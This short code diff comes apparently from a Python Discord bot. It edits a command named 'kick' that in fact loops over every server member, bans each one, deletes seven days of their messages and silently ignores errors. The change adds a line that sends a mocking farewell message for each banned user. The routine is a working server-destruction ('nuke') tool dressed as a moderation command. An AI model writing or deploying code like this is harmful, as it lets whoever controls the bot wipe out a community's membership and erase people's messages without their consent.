@@ -42,7 +42,7 @@ async def kick(ctx):
     for member in list(ctx.guild.members):
       try:
         await member.ban(reason="헤으응", delete_message_days=7)
-        (f"빠잉 {member.display_name}!")
+        await ctx.send(f"빠잉 {member.display_name}!")
       except Exception:
         pass
         
